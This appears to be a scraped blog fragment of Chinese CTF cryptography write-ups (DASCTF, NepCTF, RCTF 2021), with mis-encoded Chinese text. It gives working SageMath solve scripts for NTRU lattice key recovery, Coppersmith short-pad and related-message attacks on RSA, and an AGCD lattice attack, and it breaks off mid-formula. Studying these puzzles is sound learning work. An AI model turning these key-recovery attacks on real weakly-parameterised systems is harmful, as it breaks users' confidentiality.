encrypt(bytes_to_long(flag),h,p)print(&quot;h = {}&quot;.format(h))print(&quot;p = {}&quot;.format(p))print(&quot;c = {}&quot;.format(c))# h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004# p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469# c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700 analysesä¸å¤šè¯´äº†ï¼Œå‰é¢è¯´çš„é‚£ä¸ªblogè¯´çš„è¶…çº§æ¸…æ¥šã€‚è¿™é“é¢˜åœ¨ç”Ÿæˆå‚æ•°çš„æ—¶å€™ç»™äº†ä¸€å¤§å †æ¡ä»¶å°±æ˜¯ä¸ºäº†åœ¨æ ¼åŸºè§„çº¦çš„æ—¶å€™èƒ½å¤ŸæŠŠ$f$å’Œ$g$è§„çº¦å‡ºæ¥ã€‚è¿˜æœ‰ï¼é‚£ä¸ªåŒä½™å¼è¦å‚æ•°å¤Ÿå°æ‰èƒ½æ¨¡$g$çº¦å»éšæœºæ•°$r$ã€‚ exp123456789101112from Crypto.Util.number import long_to_bytes as l2bh = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700v1 = vector([1,h])v2 = vector([0,p])f,g = Matrix([v1,v2]).LLL()[0]f,g = abs(f),abs(g)d = int(inverse_mod(f,g))x = int((c * f) % p %g )l2b((x * d)%g) 0x03 threshold çœŸæ­£çš„NTRUï¼Œæˆ‘å¤ªèœäº†ä¸çŸ¥é“å¤šé¡¹å¼è¦æ€ä¹ˆå¤„ç†ï¼Œå»dawn_wispherçˆ·çˆ·çš„Blogå­¦ä¹ ä¸€ä¸‹ï¼Œå­¦ä¼šäº†å†æ¥æ›´æ–°3/29 ä¿ºå›æ¥äº†, ä¿ºå­¦ä¼šäº†, ä¸è¿‡è¿™è¾¹åªæ‰”ä¸€æ³¢è„šæœ¬, å…·ä½“åŸç†å¯ä»¥å»çœ‹æˆ‘çš„å¦å¤–ä¸€ç¯‡Translation of LatticeHacks problem1234567891011121314151617181920212223242526272829303132#make.sageimport randomflag = bytearray(&quot;DASCTF{********************************}&quot;.encode())flag = list(flag)length = len(flag)N=53p=257q=28019d=18f=[1]*19+[-1]*18+[0]*16random.shuffle(f)g=[1]*18+[-1]*18+[0]*17random.shuffle(g)Q.&lt;x&gt; = Zmod(q)[]P.&lt;y&gt; = Zmod(p)[]fx=Q(f)fy=P(f)gx=Q(g)Fqx=fx.inverse_mod(x^N-1)Fpy=fy.inverse_mod(y^N-1)hx=(Fqx*gx).mod(x^N-1)r=[1]*10+[-1]*22+[0]*21random.shuffle(r)rx=Q(r)mx=Q(flag)ex=(p*rx*hx+mx).mod(x^N-1)print(ex)print(hx)#7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860#14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 6022 analysesNTRU, å‚æ•°å¤Ÿå°å°±èƒ½é€šè¿‡æ ¼åŸºè§„çº¦æ±‚å‡ºç§é’¥$f$, ç„¶åé€šè¿‡æ­£å¸¸çš„è§£å¯†æµç¨‹è¿›è¡Œè§£å¯†äº† è¿™é‡Œæœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹: NTRUèƒ½å¤Ÿç”¨æ¥è§£å¯†çš„ç§é’¥$f$ä¸æ­¢ä¸€ä¸ª, æ‰€ä»¥å¯èƒ½æœ‰å¤šä¸ªç§é’¥èƒ½å¤Ÿè§£å¯†å¯†æ–‡. ç‰¹åˆ«æ˜¯è§„çº¦ä¹‹åçš„çŸ©é˜µ, å¸¸å¸¸èƒ½è§„çº¦å‡ºä¸€å¤§å †ç§é’¥$f$æ¥. åœ¨æ„é€ æ ¼å­çš„æ—¶å€™, ç³»æ•°æ—‹è½¬çš„æ–¹å‘ä¸€å®šè¦æ­£ç¡®, åœ¨åšè¿™é“é¢˜çš„æ—¶å€™æˆ‘å°±å› ä¸ºæ—‹è½¬çš„æ–¹å‘åäº†åšäº†ä¸€æ•´å¤©(æˆ‘è¿˜ä¸€ç›´ä»¥ä¸ºè‡ªå·±è§£å¯†å†™é”™äº† é€ æ ¼å­æœ‰å¾ˆå¤šæ–¹æ³•, è¿™è¾¹è®°å½•ä¸€ä¸‹ä¸¤ä¸ª ç¬¬ä¸€ä¸ªæ ¼å­è§„çº¦å‡ºæ¥çš„ä¸Šé¢$n$è¡Œ, æ¯è¡Œçš„å‰ä¸€åŠæ˜¯ç§é’¥$f$, åä¸€åŠæ˜¯éšæœºå‘é‡$g$$$\\begin{pmatrix}1&amp;0&amp;\\cdots&amp;0&amp;h_0&amp;h_1&amp;\\cdots &amp;h_{n-1} \\\\0&amp;1&amp;\\cdots&amp;0&amp;h_{n-1}&amp;h_0&amp;\\cdots&amp;h_{n-2} \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\0&amp;0&amp;\\cdots&amp;1&amp;h_{1}&amp;h_2&amp;\\cdots&amp;h_{0} \\\\0&amp;0&amp;\\cdots&amp;0&amp;p&amp;0&amp;\\cdots&amp;0 \\\\0&amp;0&amp;\\cdots&amp;0&amp;0&amp;p&amp;\\cdots&amp;0 \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\0&amp;0&amp;\\cdots&amp;0&amp;0&amp;0&amp;\\cdots&amp;p\\end{pmatrix}$$ç¬¬äºŒä¸ªæ ¼å­è§„çº¦å‡ºæ¥çš„ä¸Šé¢$n$è¡Œ, æ¯è¡Œçš„åä¸€åŠæ˜¯ç§é’¥$f$, å‰ä¸€åŠæ˜¯éšæœºå‘é‡$g$$$\\begin{pmatrix}p&amp;0&amp;\\cdots&amp;0&amp;0&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0&amp;0&amp;0&amp;\\cdots&amp;0 \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\0&amp;0&amp;\\cdots&amp;p&amp;0&amp;0&amp;\\cdots&amp;0 \\\\h_0&amp;h_1&amp;\\cdots &amp;h_{n-1}&amp;1&amp;0&amp;\\cdots&amp;0 \\\\h_{n-1}&amp;h_0&amp;\\cdots&amp;h_{n-2}&amp;0&amp;1&amp;\\cdots&amp;0 \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\h_{1}&amp;h_2&amp;\\cdots&amp;h_{0}&amp;0&amp;0&amp;\\cdots&amp;1\\end{pmatrix}$$ exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from random import *Zx.&lt;x&gt; = ZZ[]def balancedmod(f,N,q): g = list(((f[i] + q//2) %q) - q//2 for i in range(N)) return Zx(g)def convolution(f,g,N): return (f*g) % (x^N-1)def randomdpoly(d,N): assert d &lt;= N result = N*[0] for j in range(d): while True: r = randrange(N) if not result[r]: break result[r] = 1 - 2*randrange(2) return Zx(result)def invertmodprime(f,N,p): T = Zx.change_ring(Integers(p)).quotient(x^N-1) return Zx(lift(1 / T(f)))def invertmodpowerof2(f,N,q): assert q.is_power_of(2) g = invertmodprime(f,2,N) while True: r = balancedmod(convolution(g,f),q) if r == 1: return g g = balancedmod(convolution(g,2 - r),q) def randommessage(N,p): result = list(randrange(p) - 1 for j in range(N)) return Zx(result) def keypair(d,N,q,p): while True: try: f = randomdpoly(d,N) fp = invertmodprime(f,N,p) fq = invertmodpowerof2(f,N,q) break except: pass g = randomdpoly() publickey = balancedmod(p * convolution(fq,g,N),N,q) secretkey = f,fp return publickey,secretkeydef encrypt(message,publickey,N,q): r = randomdpoly(randint(N)) return balancedmod(convolution(publickey,r) + message,N,q)def decrypt(ciphertext,secretkey,N,q,p): f,fp = secretkey a = balancedmod(convolution(ciphertext,f,N),N,q) return balancedmod(convolution(a,fp,N),N,p) def balancedmod(f,N,q): g = list(((f[i] + q//2) %q) - q//2 for i in range(N)) return Zx(g)def invertmodprime(f,N,p): T = Zx.change_ring(Integers(p)).quotient(x^N-1) return Zx(lift(1 / T(f)))def convolution(f,g,N): return (f*g) % (x^N-1)N = 53q = 28019p = 257B = Matrix([[0 for _ in range(2*N)] for _ in range(2*N)])ex = ...hx = ...H = hx.list()sigma = 1_lambda = 1for i in range(N): for j in range(N): B[i+N,j] = int(H[j-i]) if i == j: B[i,j] = sigma * q B[N+i,N+j] = _lambda * 1 L = B.LLL()[1]fx = Zx(list(L[N:]))fp = invertmodprime(fx,N,p)for i in decrypt(ex,(fx,fp),N,q,p).list(): print(chr(abs(i)),end='') è¿™ä¸ªexpé¡ºä¾¿æŠŠä¸€äº›è¦ç”¨åˆ°çš„è¿ç®—ä¹Ÿæ”¾è¿‡æ¥äº†, ä»¥ååšNTRUå¯ä»¥ç”¨è¿™äº›è¿ç®—æ¥åš","link":"/2021/03/27/writeup-for-2021-3%E6%9C%88dsactf/"},{"title":"writeup for 2021 NepCTF(To be continued","text":"å¤ªèœäº†å¤ªèœäº†å¤ªèœäº†, è™½ç„¶è¯´è·‘å‡ºå»ç©äº†ä¸¤å¤©, ä½†è¿˜æ˜¯èŠ±äº†åŠå¤©æ—¶é—´åšçš„, ä¸€é“Coppersmithâ€™s short-pad attackæ²¡æœ‰æƒ³åˆ°è°ƒ$\\beta$, åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, å±å®æ‹‰äº†. æœ€åä¹Ÿå°±åšäº†ä¸ªæ”¹è¡¨çš„base64â€¦.ç®—æ˜¯é™¤äº†ç­¾åˆ°å°±æ²¡å‡ºå§(è¿˜æœ‰é“å¤å…¸ä¸æƒ³æŸ¥äº†5555 0x00 Real_Baseproblem12345678910111213141516171819202122232425262728293031323334#py2import stringimport randomfrom secret import flag,b_chardef encode(s): res='' binstr=[ bin(ord(s[i])).replace('0b','').zfill(8) for i in range(len(s))] p1=len(binstr) // 3 p2=len(binstr) % 3 part1 = binstr[0:3*p1] for i in range(p1): str_p1=binstr[i*3]+binstr[i*3+1]+binstr[i*3+2] tmp_str = [str_p1[x: x + 6] for x in [0, 6, 12, 18]] tmp_res = [b_char[int(x,2)]for x in tmp_str] res+=''.join(tmp_res) if p2: part2 = binstr[3*p1:] str_p2 = ''.join(part2)+(3-p2)*'0'*8 tmp_str = [str_p2[x: x + 6] for x in [0, 6, 12, 18]][:p2+1] tmp_res = [b_char[int(x,2)]for x in tmp_str] res+=''.join(tmp_res) res +='='*(3-p2) return res m1=random.sample(list(b_char),50)print ''.join(m1)print encode(m1)print encode(flag)# rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P# 2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa=# tCvM4R3TzvZ7nhjBxSiNyxmP28e7qCjVxQn91SRM3gBKzxQ= çœ‹äº†ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹, å°±æ˜¯ä¸ªbase64, ä½†æ˜¯è¡¨æœªçŸ¥, ç›´æ¥é€šè¿‡ä¸€å¯¹æ˜æ–‡å’Œå¯†æ–‡å›æ¨è¡¨, å¾—å‡ºéƒ¨åˆ†è¡¨åŸºæœ¬ä¸Šå°±èƒ½çŒœå‡ºæ•´ä¸ªè¡¨äº†, ç›´æ¥ç”¨æ”¹è¿‡çš„è¡¨è§£ç å°±è¡Œäº†. exp å½“æ—¶åšçš„æ—¶å€™çš„è„šæœ¬ä¸è§äº†5555555 0x01 ä½ ä»¬ä¸€å¤©å¤©çš„ä¸å†™ä»£ç , éš¾é“æ˜¯åœ¨ç­‰å¾…çˆ±æƒ…å¤å…¸å¤§æ··åˆ, ä»€ä¹ˆé“¶æ²³å­—æ¯, å¤ç²¾çµâ€¦..ä¸æ‰¾äº† 0x02 ChildRSAproblem12345678910111213141516171819202122232425262728293031323334353637383940414243#childrsa.pyfrom Crypto.Util.number import *from gmpy2 import irootfrom os import *from secret import flag1,flag2,padding1,padding2assert len(flag1)==20assert len(flag1)&gt;len(flag2)assert len(flag2)==len(padding2)def init1(): m=(padding1*2**200+bytes_to_long(flag1))*2**200 r1=getPrime(170) r2=getPrime(170) p=getPrime(1024) q=getPrime(1024) N=p*q return m,r1,r2,N def enc1(m,r1,r2,N): c1=pow(m+r1,3,N) c2=pow(m+r2,3,N) return c1,c2def init2(): prefix = 2**1000 r3 = prefix+flag2*2**200 r4 = 2*prefix+padding2*2**200 return r3,r4def enc2(r3,r4): c3 = pow(r3*r4,3) return c3(m,r1,r2,N) = init1()(c1,c2)=enc1(m,r1,r2,N)(r3,r4) = init2()c3 = enc2(r3,r4)print Nprint(c1,c2,c3)# output.txtN= ...(c1,c2,c3)= ... å°±æ˜¯è¿™é“é¢˜åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, å½“æ—¶è¯•äº†å¥½ä¹…çš„Coppersmithâ€™s short-pad attack(åé¢ç®€å†™ä¸ºCsp atk, è¿$\\epsilon$éƒ½ä»0.01éå†åˆ°1äº†, ä¾æ—§æ²¡æœ‰å‡ºç»“æœ, çœ‹äº†å®˜æ–¹wp, WTF??? $\\beta$è°ƒæˆ1???, ä¸ºä»€ä¹ˆ? æŠ±ç€è¿™ä¸ªé—®é¢˜æˆ‘åˆé‡æ–°ç¿»äº†ä¸€ä¸‹Sagemathæ–‡æ¡£, æ‰¾åˆ°äº†small_roots()çš„è§£é‡Š: sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots(self, X=None, beta=1.0, epsilon=None, **kwds) â€‹ Let $N$ be the characteristic of the base ring this polynomial is defined over: N = self.base_ring().characteristic(). This method returns small roots of this polynomial modulo some factor $b$ of $N$ with the constraint that $b&gt;=N^Î²$. Small in this context means that if $x$ is a root of $f$ modulo $b$ then $|x|&lt;X$. This $X$ is either provided by the user or the maximum $X$ is chosen such that this algorithm terminates in polynomial time. If $X$ is chosen automatically it is $X=ceil(1/2N^{Î²^2/Î´âˆ’Ïµ})$. The algorithm may also return some roots which are larger than X. This algorithm in this context means Coppersmithâ€™s algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander Mayâ€™s PhD thesis referenced below. INPUT: X â€“ an absolute bound for the root (default: see above) beta â€“ compute a root mod $b$ where $b$ is a factor of N and $b â‰¥N^Î².$ ( Default: 1.0, so $b=N$. ) epsilon â€“ the parameter $Ïµ$ described above. (Default: $Î²/8$) **kwds â€“ passed through to method Matrix_integer_dense.LLL(). REFERENCES: Don Coppersmith. Finding a small root of a univariate modular equation. In Advances in Cryptology, EuroCrypt 1996, volume 1070 of Lecture Notes in Computer Science, p. 155â€“165. Springer, 1996. http://cr.yp.to/bib/2001/coppersmith.pdf Alexander May. New RSA Vulnerabilities Using Lattice Reduction Methods. PhD thesis, University of Paderborn, 2003. http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf æ–‡æ¡£é‡Œé¢ç»™å‡ºäº†small_roots()ä½¿ç”¨çš„ç®—æ³•çš„paper, æœ‰æ—¶é—´å¥½å¥½çœ‹ä¸€ä¸‹.è¿™ä¸ªå‡½æ•°éœ€è¦æ³¨æ„çš„æœ‰ä¸‰ä¸ªå‚æ•°X,beta,epsilon, å…¶ä¸­betaå’Œepsilonä¹Ÿå°±æ˜¯$\\beta$å’Œ$ \\epsilon$ . æ¥çœ‹çœ‹è¿™ä¸‰ä¸ªå‚æ•°éƒ½è¯¥æ€ä¹ˆå¡« $X$: è¿™ä¸ªç®—æ˜¯æœ€å¥½å¡«çš„, å¯ä»¥ç†è§£æˆsmallrootçš„ä¸Šç•Œ, ä¸€èˆ¬æ¥è¯´é¢˜ç›®ä¸­ç»™å‡ºäº†è¦è§£çš„å°æ ¹çš„ä½æ•°kbitså°±è®¾ç½®$X = 2^{kbits}$. è€Œåœ¨Csp atkä¸­, ç†è®ºå¯è§£ä¸Šç•Œæ˜¯$N.nbits \\over e^2$ $\\beta$: è¿™ä¸ª$\\beta$å¯ä»¥ç†è§£æˆ$N$çš„å› å­çš„ä¸‹ç•Œ, å¯¹äºå¸¸è§„RSAä¸­çš„$N$, ä¸€èˆ¬å°±åªæœ‰$1,N,p,q$å››ä¸ªå› å­, æˆ‘ä»¬å¯ä»¥é€‰å–$N,p,q$ä½œä¸ºç®—æ³•ä½¿ç”¨çš„å› å­, æ‰€ä»¥å…¶å®$\\beta$å¯ä»¥ä»0å–åˆ°1, å› ä¸ºéƒ½å¯èƒ½æˆç«‹, ä½†çœŸæ­£ç”¨çš„æ—¶å€™ä¸€èˆ¬å–$[0.4,0.6] \\cup {1}$. $\\epsilon$: ç¥å¥‡çš„å‚æ•°, ä¸å¡«å°±æ˜¯$\\beta \\over 8$, æ–‡æ¡£ä¸­ç»™å‡ºäº†ä¸€ä¸ªå…³ç³»å¼$X=ceil(1/2N^{Î²^2/Î´âˆ’Ïµ})$, å…¶å®è¿™ä¸ª$ceil$å¯ä»¥æš‚æ—¶å¿½ç•¥æ‰, æ‰€ä»¥å°±æœ‰$2X=N^{\\beta^2/\\delta-\\epsilon}$, æ–‡æ¡£é‡Œå¹¶æ²¡æœ‰ç»™å‡º$\\delta$ åˆ°åº•è¯¥å¦‚ä½•å–, ä½†ä»è¿™é¢˜çš„å®˜æ–¹wpä¸­æ˜¯ç»™å‡ºäº†$\\delta = e^2$, å…¶å®å°±æ˜¯å¤šé¡¹å¼çš„æ¬¡æ•°. æ‰€ä»¥å¯¹äºCsp atkæ¥è¯´, $\\epsilon = \\beta^{2} / e^2 - x$, $x$çš„å–æ³•ä¸º$N^x = X.nbits $ æ‰€ä»¥è¯´,$\\beta$å¡«1ä¹Ÿæ˜¯é˜”ä»¥çš„! å› ä¸ºfactoré‡Œé¢æ˜¯æœ‰$N$çš„! æŒ‰ç€ä¸Šé¢çš„åˆ†æ, æŠŠä»Laä½¬é‚£è¾¹æ‹¿æ¥çš„Csp atkçš„æ¿å­ç¨å¾®ä¿®æ”¹ä¸€ä¸‹( ä»¥åå°±ç”¨æ”¹è¿›è¿‡çš„æ¿å­äº†å˜¿å˜¿å˜¿â€¦. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def short_pad_attack(c1, c2, e, n , kbits = 0): if kbits == 0 : kbits = n.nbits()//(e*e) PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() x = ceil(n.nbits() // kbits) for b in [0.4,0.5,0.6,1]: eps = (b^2) / (e^2) - (1/x) print(eps) if eps &lt;= 0: eps = b / 8 print('[+] try beta={} epsilon={}'.format(float(b),float(eps))) diff = h.small_roots(X=2^kbits, beta=b,epsilon=eps) if len(diff) &gt; 0 : print('[+] find diff with beta={} and epsilon={}'.format(b,eps)) return diff print('[-] can not find the diff') return diff def related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]from Crypto.Util.number import long_to_bytes as l2bn = ...(c1,c2,c3)= ...e= 3diff = short_pad_attack(c1,c2,e,n,kbits=170)[0]res = related_message_attack(c1,c2,diff,e,n)l2b(res)# b'\\xd4!I\\x80M\\xf0\\x80\\\\\\xd9&gt;\\x19\\xad\\xdd^\\x1d$\\x99\\xc1V\\xc9/+\\xdc\\x97&quot;\\xb3 \\x03\\xef3\\xd1\\xea\\x04\\xf4\\x81z$\\xd2]{\\xcb\\xc4\\x93\\xe7\\xf6\\xb7\\x9a\\xb2\\xe6a\\x9fl\\x99\\xady\\xa8\\x9e\\xa2\\xf5\\'\\xa2\\xfc\\xe0Z\\xa1\\x1c\\x15\\rQ\\x7fM\\x99T\\x93\\x04\\xc5\\xdd\\xdc\\x80\\xe4\\x0f\\x85)\\x9f\\xc3p\\xdc\\x03j.\\x87kU\\'Ud\\x0bD&quot;)\\x00\\x00\\x00\\x00\\x00Nep{Nep_n3p_ba4_bad_\\x00\\x00\\x00\\x03\\tx@Q2\\x1b3\\x1f\\r\\xb2\\x95\\x86?kE\\x1f\\xe6\\xaay\\xf1\\xe5' å¯ä»¥çœ‹åˆ°flagå·²ç»å‡ºæ¥ä¸€éƒ¨åˆ†äº†Nep{Nep_n3p_ba4_bad_ æ¥çœ‹çœ‹æ€ä¹ˆæ±‚flag2, å…ˆæŠŠç»™çš„æ¡ä»¶å†™å‡ºæ¥, æˆ‘ä»¬è®°$flag_2 = f , padding = pd$$$r_3 = 2^{1000}+ 2^{200}f \\\\r_4 = 2^{1001}+ 2^{200}pd \\\\(r_3r_4)^3 = c_3$$å®˜æ–¹wpä¸Šé¢è¯´æƒ³è€ƒä¸€ä¸‹äºŒå…ƒçš„Coopersmith, å…ˆæ”¾ç€, æœ‰ç©ºäº†å­¦ä¹ ä¸€æ³¢. è¿™é¢˜è¿˜å¯ä»¥ç›´æ¥è§£ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç›´æ¥å‡º è§£æ–¹ç¨‹è§£æ³•æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å¼€ä¸‰æ¬¡æ–¹å¾—å‡º$r_3r_4 = R$å’±ä»¬å…ˆè”ç«‹ä¸€ä¸‹$r3,r4$çš„ä¸¤ä¸ªå¼å­$$2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \\cdot f = r_{34} \\tag1$$è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹, $pd,f \\le 2^{160}$, ä¹Ÿå°±æ˜¯è¯´$2^{400} pd \\cdot f &lt; 2^{1200}$æ‰€ä»¥å…¶å®å’±ä»¬å¯ä»¥ç›´æ¥æœ‰$$2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \\cdot f \\equiv 2^{400}pd \\cdot f \\equiv r_{34} \\mod 2^{1200} \\\\2^{400}pd \\cdot f = r_{34} % \\ 2^{1200}$$è¿™æ ·æˆ‘ä»¬å°±èƒ½æ±‚å‡º$pd \\cdot f = a$äº†, ç„¶åæˆ‘ä»¬ç›´æ¥$(1)$å¼ä¸¤è¾¹åŒæ—¶ä¹˜$f$, æŠŠ$pd \\cdot f$å¸¦å…¥, å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªå…³äº$f$çš„ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹äº†.$$2^{2001} \\cdot f + 2^{1200} a +2^{1201}f^2+ 2^{400} a \\cdot f = r_{34} \\cdot f$$è§£å‡º$f$å‘ç°â€¦æ˜¯å‡flag, mdæˆ‘ç®—äº†é‚£ä¹ˆä¹…å±…ç„¶æ˜¯ä¸ªå‡çš„??? çªç„¶æƒ³åˆ°ä¼šä¸ä¼špadding2æ‰æ˜¯çœŸæ­£çš„flag, åˆæŠŠpadding2ç®—å‡ºæ¥äº†, æœç„¶â€¦.padding2æ‰æ˜¯çœŸflag exp12345678c = int(c3.nth_root(3) % (2^2001))pdf = int(c %2^1200 // 2^400)x = var('x')f = 2^1200 * pdf - c * x + 2^1201 * x^2 + 2^400 * x * pdfflag2 = int(f.roots()[0][0])padding = pdf // flag2l2b(padding)# b'1_l0v3_9ou}' æ‰€ä»¥æœ€åçš„flagå°±æ˜¯Nep{Nep_n3p_ba4_bad_1_l0v3_9ou} 0x03 easyEncryption æš‚æ—¶è¿˜æ²¡æ—¶é—´, æœ‰ç©ºçœ‹çœ‹ 0x04 lowExponent æš‚æ—¶è¿˜æ²¡æ—¶é—´, æœ‰ç©ºçœ‹çœ‹","link":"/2021/03/24/writeup-for-2021-NepCTF/"},{"title":"writeup-for-2021-RCTF","text":"Uncommon Factor â… problem1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Poolsize = 2^22flag = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()assert len(flag) == 22assert flag[:5] == b&quot;flag{&quot;assert flag[-1:] == b&quot;}&quot;seed = flag[5:-1] # 128 bitseed = (int.from_bytes(seed,'big')&lt;&lt;48) + (randint(0,2^24)&lt;&lt;(128+48)) # 200 bitub = seed + 2^48lb = seedthreads = 64def f(i): p = random_prime(ub, lbound=lb, proof=False) q = random_prime(2**312, proof=False) N = p*q return Ndef reseed(i): set_random_seed()pool = Pool(processes=threads)pool.map(reseed,range(size))lN = pool.map(f,range(size))pool.close()pool.join()lN.sort()with open(&quot;lN.bin&quot;,&quot;wb&quot;) as f: for n in lN: f.write(int(n).to_bytes(512//8,&quot;big&quot;)) å‚æ•°çš„å¤§å°å˜äº†, AGCDä¸ç®¡ç”¨äº†, ç­‰çˆ·çˆ·wpäº†, Uncommon Factor â…¡problem1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Poolsize = 2^7flag = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()assert len(flag) == 22assert flag[:5] == b&quot;flag{&quot;assert flag[-1:] == b&quot;}&quot;seed = flag[5:-1] # 128 bitseed = (int.from_bytes(seed,'big')&lt;&lt;104) + (randint(0,2^80)&lt;&lt;(128+104)) # 312 bitub = seed + 2^104lb = seedthreads = 64def f(i): p = random_prime(ub, lbound=lb, proof=False) q = random_prime(2**200, proof=False) N = p*q return Ndef reseed(i): set_random_seed()pool = Pool(processes=threads)pool.map(reseed,range(size))lN = pool.map(f,range(size))pool.close()pool.join()lN.sort()with open(&quot;lN.bin&quot;,&quot;wb&quot;) as f: for n in lN: f.write(int(n).to_bytes(512//8,&quot;big&quot;)) å°è¯•$AGCD$åšå‡ºæ¥äº†, çœ‹çœ‹æ•´ä¸ªæµç¨‹, å¯ä»¥çŸ¥é“$n$çš„å¼å­$$n_i = (2^{232} \\cdot r_i + 2^{104} \\cdot flag + R_i)q_i$$ä¸¤è¾¹æ•´é™¤$2^{104}$å†æŠŠ$flag$æ‹†å‡ºæ¥å°±æœ‰$${n_i \\over 2^{104}} = flag \\cdot q_i + (2^{128} \\cdot r_i \\cdot q_i + {R_iq_i \\over 2^{104}})\\ä¹Ÿå°±æ˜¯{n_i \\over 2^{104}} = flag \\cdot q_i + (2^{128} \\cdot r_i \\cdot q_i + \\hat R_i)$$æŠŠæ‹¬å·é‡Œçš„çœ‹æˆä¸€ä¸ªæ•´ä½“, æ±‚$flag$å°±å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ª$AGCD$é—®é¢˜äº†, é¢˜ç›®ä¹Ÿç»™äº†å¾ˆå¤šä¸ª$n$, æ„é€ å¸¸è§„çš„æ ¼å­å°±è¡Œäº†$$\\begin{pmatrix}2^a &amp; n_1 &amp; n_2 &amp; \\cdots &amp; 